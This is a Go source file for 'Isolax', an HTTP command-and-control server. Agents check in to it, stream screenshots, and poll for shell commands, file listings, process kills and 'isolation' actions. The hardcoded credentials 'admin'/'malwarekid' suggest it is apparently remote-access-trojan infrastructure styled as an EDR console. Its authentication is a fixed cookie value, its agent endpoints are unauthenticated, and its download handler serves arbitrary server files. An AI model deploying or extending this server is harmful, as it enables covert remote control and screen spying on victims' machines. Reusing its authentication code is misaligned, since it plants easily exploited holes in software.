package main

import (
	"embed"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	username      = "admin"
	password      = "malwarekid"
	sessionCookie = "isolax-session"
	listenAddr    = ":8080"
	timeout       = 10 * time.Second
)

type Client struct {
	Frame     []byte
	Timestamp time.Time
	OS        string
	Version   string
}

type ShellCommand struct {
	Command string
}

type ShellResponse struct {
	Output string
}

type KillRequest struct {
	PID int `json:"pid"`
}

type FileInfo struct {
	Name    string `json:"name"`
	Size    int64  `json:"size"`
	IsDir   bool   `json:"is_dir"`
	ModTime string `json:"mod_time"`
	Path    string `json:"path"`
}

type FileRequest struct {
	Action string `json:"action"`
	Path   string `json:"path"`
}

type EDRCommand struct {
	Type string `json:"type"` // "isolate" or "unisolate"
}

var (
	mu             sync.RWMutex
	clients        = make(map[string]*Client)
	commands       = make(map[string]string)
	responses      = make(map[string]string)
	commandHistory = make(map[string]string)
	fileCommands   = make(map[string]FileRequest)
	fileResponses  = make(map[string][]FileInfo)
	edrCommands    = make(map[string]string) // clientID -> "isolate" / "unisolate"

	// NEW: isolation state + history
	isolationState = make(map[string]string)   // clientID -> "Normal"/"Isolated"
	isolationLog   = make(map[string][]string) // clientID -> []history lines
)

//go:embed templates/*
var templateFS embed.FS

var templates = template.Must(template.New("").Funcs(template.FuncMap{
	"formatSize": func(size int64) string {
		const unit = 1024
		if size < unit {
			return fmt.Sprintf("%d B", size)
		}
		div, exp := int64(unit), 0
		for n := size / unit; n >= unit; n /= unit {
			div *= unit
			exp++
		}
		return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
	},
}).ParseFS(templateFS, "templates/*.html"))

func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		templates.ExecuteTemplate(w, "login.html", nil)
		return
	}
	_ = r.ParseForm()
	if r.FormValue("username") == username && r.FormValue("password") == password {
		http.SetCookie(w, &http.Cookie{Name: sessionCookie, Value: "ok", Path: "/"})
		http.Redirect(w, r, "/", http.StatusFound)
	} else {
		templates.ExecuteTemplate(w, "login.html", map[string]string{"Error": "Invalid credentials"})
	}
}

func isAuthenticated(r *http.Request) bool {
	cookie, err := r.Cookie(sessionCookie)
	return err == nil && cookie.Value == "ok"
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	mu.RLock()
	defer mu.RUnlock()

	var clientsData []map[string]interface{}
	for id, c := range clients {
		status := "offline"
		statusClass := "offline"
		if time.Since(c.Timestamp) < timeout {
			status = "online"
			statusClass = "online"
		}

		iso := "Normal"
		if s, ok := isolationState[id]; ok && s != "" {
			iso = s
		}

		clientsData = append(clientsData, map[string]interface{}{
			"ID":          id,
			"Status":      status,
			"StatusClass": statusClass,
			"OS":          c.OS,
			"Version":     c.Version,
			"Isolation":   iso,
		})
	}

	templates.ExecuteTemplate(w, "index.html", clientsData)
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	http.SetCookie(w, &http.Cookie{Name: sessionCookie, Value: "", Path: "/", MaxAge: -1})
	http.Redirect(w, r, "/login", http.StatusFound)
}

func viewerHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Missing client ID", http.StatusBadRequest)
		return
	}

	mu.RLock()
	state := isolationState[clientID]
	if state == "" {
		state = "Normal"
	}
	history := isolationLog[clientID]
	mu.RUnlock()

	data := map[string]interface{}{
		"ClientID":  clientID,
		"Isolation": state,
		"History":   history,
	}

	templates.ExecuteTemplate(w, "viewer.html", data)
}

func shellHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID is missing", http.StatusBadRequest)
		return
	}

	var output string
	clearRequested := r.FormValue("clear") == "1"

	if r.Method == http.MethodPost {
		if clearRequested {
			mu.Lock()
			commandHistory[clientID] = ""
			mu.Unlock()
		} else {
			cmd := r.FormValue("command")
			if cmd == "" {
				http.Error(w, "Command is empty", http.StatusBadRequest)
				return
			}

			mu.Lock()
			commands[clientID] = cmd
			mu.Unlock()

			timeoutCh := time.After(10 * time.Second)
			ticker := time.NewTicker(500 * time.Millisecond)
			defer ticker.Stop()

			for {
				select {
				case <-timeoutCh:
					output = "Command timed out"
					goto done
				case <-ticker.C:
					mu.RLock()
					if resp, exists := responses[clientID]; exists && resp != "" {
						output = resp
						responses[clientID] = ""
						mu.RUnlock()
						goto done
					}
					mu.RUnlock()
				}
			}

		done:
			if output == "" {
				output = "No output from command"
			}

			entry := fmt.Sprintf("> %s\n%s\n", cmd, output)
			mu.Lock()
			commandHistory[clientID] += entry
			mu.Unlock()
		}
	}

	mu.RLock()
	history := commandHistory[clientID]
	mu.RUnlock()

	templates.ExecuteTemplate(w, "shell.html", map[string]interface{}{
		"ClientID": clientID,
		"History":  history,
	})
}

func filesHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID is missing", http.StatusBadRequest)
		return
	}

	currentPath := r.FormValue("path")
	if currentPath == "" {
		currentPath = "/"
	}

	mu.Lock()
	fileCommands[clientID] = FileRequest{
		Action: "list",
		Path:   currentPath,
	}
	mu.Unlock()

	var files []FileInfo

	timeoutCh := time.After(5 * time.Second)
	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-timeoutCh:
			goto render
		case <-ticker.C:
			mu.Lock()
			if resp, ok := fileResponses[clientID]; ok {
				files = resp
				delete(fileResponses, clientID)
				mu.Unlock()
				goto render
			}
			mu.Unlock()
		}
	}

render:
	templates.ExecuteTemplate(w, "files.html", map[string]interface{}{
		"ClientID":    clientID,
		"Files":       files,
		"CurrentPath": currentPath,
	})
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Missing client ID", http.StatusBadRequest)
		return
	}

	// system info
	if r.Header.Get("Content-Type") == "application/json" {
		var info map[string]string
		body, _ := io.ReadAll(r.Body)
		_ = json.Unmarshal(body, &info)

		mu.Lock()
		if client, exists := clients[clientID]; exists {
			client.OS = info["os"]
			client.Version = info["version"]
			client.Timestamp = time.Now()
		} else {
			clients[clientID] = &Client{
				OS:        info["os"],
				Version:   info["version"],
				Timestamp: time.Now(),
			}
		}
		mu.Unlock()
		return
	}

	// screenshot frame
	img, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println("Read error:", err)
		return
	}
	mu.Lock()
	if client, exists := clients[clientID]; exists {
		client.Frame = img
		client.Timestamp = time.Now()
	} else {
		clients[clientID] = &Client{Frame: img, Timestamp: time.Now()}
	}
	mu.Unlock()
}

func streamHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	clientID := r.URL.Query().Get("client")
	w.Header().Set("Content-Type", "multipart/x-mixed-replace; boundary=frame")
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming unsupported!", http.StatusInternalServerError)
		return
	}

	for {
		mu.RLock()
		client, exists := clients[clientID]
		mu.RUnlock()
		if !exists || time.Since(client.Timestamp) > timeout {
			time.Sleep(100 * time.Millisecond)
			continue
		}
		if client.Frame != nil {
			fmt.Fprintf(w, "--frame\r\nContent-Type: image/jpeg\r\nContent-Length: %d\r\n\r\n", len(client.Frame))
			_, _ = w.Write(client.Frame)
			fmt.Fprintf(w, "\r\n")
			flusher.Flush()
		}
		time.Sleep(66 * time.Millisecond)
	}
}

func commandPollHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	mu.Lock()
	cmd := commands[clientID]
	commands[clientID] = ""
	mu.Unlock()
	_ = json.NewEncoder(w).Encode(ShellCommand{Command: cmd})
}

func commandResultHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	var result ShellResponse
	body, _ := ioutil.ReadAll(r.Body)
	_ = json.Unmarshal(body, &result)
	mu.Lock()
	responses[clientID] = result.Output
	mu.Unlock()
}

func filePollHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	mu.Lock()
	defer mu.Unlock()

	if req, exists := fileCommands[clientID]; exists {
		delete(fileCommands, clientID)
		_ = json.NewEncoder(w).Encode(req)
	} else {
		_ = json.NewEncoder(w).Encode(FileRequest{})
	}
}

func fileResultHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	var result []FileInfo
	body, _ := ioutil.ReadAll(r.Body)
	_ = json.Unmarshal(body, &result)
	mu.Lock()
	fileResponses[clientID] = result
	mu.Unlock()
}

func processPollHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	mu.Lock()
	cmd := commands[clientID+"_proc"]
	commands[clientID+"_proc"] = ""
	mu.Unlock()
	_ = json.NewEncoder(w).Encode(map[string]string{"command": cmd})
}

func processResultHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	var result map[string]string
	body, _ := ioutil.ReadAll(r.Body)
	_ = json.Unmarshal(body, &result)

	mu.Lock()
	responses[clientID+"_proc"] = result["output"]
	mu.Unlock()
}

func processHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Missing client ID", http.StatusBadRequest)
		return
	}

	// handle kill action
	if r.Method == http.MethodPost && r.FormValue("action") == "kill" {
		pid := r.FormValue("pid")
		if pid != "" {
			log.Printf("Request to kill PID %s for client %s\n", pid, clientID)
			mu.Lock()
			commands[clientID+"_kill"] = pid
			mu.Unlock()
		}
	}

	// always request fresh list
	mu.Lock()
	commands[clientID+"_proc"] = "list"
	mu.Unlock()

	var output string
	timeoutCh := time.After(5 * time.Second)
	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-timeoutCh:
			goto parsed
		case <-ticker.C:
			mu.Lock()
			if resp, ok := responses[clientID+"_proc"]; ok && resp != "" {
				output = resp
				responses[clientID+"_proc"] = ""
				mu.Unlock()
				goto parsed
			}
			mu.Unlock()
		}
	}

parsed:
	var processes []map[string]string
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) >= 2 {
			processes = append(processes, map[string]string{
				"PID":  fields[0],
				"Name": strings.Join(fields[1:], " "),
			})
		}
	}

	templates.ExecuteTemplate(w, "processes.html", map[string]interface{}{
		"ClientID":  clientID,
		"Processes": processes,
	})
}

func processDataHandler(w http.ResponseWriter, r *http.Request) {
	// If you don't use this anymore you can remove this handler from routes.
	http.Error(w, "Not implemented", http.StatusNotFound)
}

func killHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Missing client ID", http.StatusBadRequest)
		return
	}

	mu.Lock()
	pid := commands[clientID+"_kill"]
	commands[clientID+"_kill"] = ""
	mu.Unlock()

	pidInt, _ := strconv.Atoi(pid)
	resp := KillRequest{PID: pidInt}
	_ = json.NewEncoder(w).Encode(resp)
}

func downloadHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}

	filename := r.URL.Query().Get("file")
	if filename == "" {
		http.Error(w, "Missing filename", http.StatusBadRequest)
		return
	}

	if strings.Contains(filename, "..") {
		http.Error(w, "Invalid filename", http.StatusBadRequest)
		return
	}

	w.Header().Set("Content-Disposition", "attachment; filename="+filepath.Base(filename))
	http.ServeFile(w, r, filename)
}

// isolation UI: /edr/action?client=<id>&type=isolate|unisolate
func edrActionHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}

	clientID := r.URL.Query().Get("client")
	action := r.URL.Query().Get("type")

	if clientID == "" {
		http.Error(w, "Missing client ID", http.StatusBadRequest)
		return
	}
	if action != "isolate" && action != "unisolate" {
		http.Error(w, "Invalid action", http.StatusBadRequest)
		return
	}

	label := "Normal"
	if action == "isolate" {
		label = "Isolated"
	}

	entry := fmt.Sprintf("%s • %s",
		time.Now().Format("2006-01-02 15:04:05"),
		strings.ToUpper(action),
	)

	mu.Lock()
	isolationState[clientID] = label

	hist := isolationLog[clientID]
	hist = append([]string{entry}, hist...)
	if len(hist) > 20 {
		hist = hist[:20]
	}
	isolationLog[clientID] = hist

	edrCommands[clientID] = action
	mu.Unlock()

	http.Redirect(w, r, "/viewer?client="+clientID, http.StatusSeeOther)
}

// polled by client
func edrCommandPollHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Missing client ID", http.StatusBadRequest)
		return
	}

	mu.Lock()
	cmd := edrCommands[clientID]
	edrCommands[clientID] = ""
	mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(EDRCommand{Type: cmd})
}

func main() {
	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/login", loginHandler)
	http.HandleFunc("/logout", logoutHandler)
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/stream", streamHandler)
	http.HandleFunc("/viewer", viewerHandler)
	http.HandleFunc("/shell", shellHandler)
	http.HandleFunc("/files", filesHandler)
	http.HandleFunc("/cmd/poll", commandPollHandler)
	http.HandleFunc("/cmd/result", commandResultHandler)
	http.HandleFunc("/file/poll", filePollHandler)
	http.HandleFunc("/file/result", fileResultHandler)
	http.HandleFunc("/processes", processHandler)
	http.HandleFunc("/proc/poll", processPollHandler)
	http.HandleFunc("/proc/result", processResultHandler)
	http.HandleFunc("/kill", killHandler)
	http.HandleFunc("/download", downloadHandler)
	http.HandleFunc("/edr/action", edrActionHandler)
	http.HandleFunc("/edr/cmd/poll", edrCommandPollHandler)

	log.Printf("Isolax server running on %s", listenAddr)
	log.Fatal(http.ListenAndServe(listenAddr, nil))
}
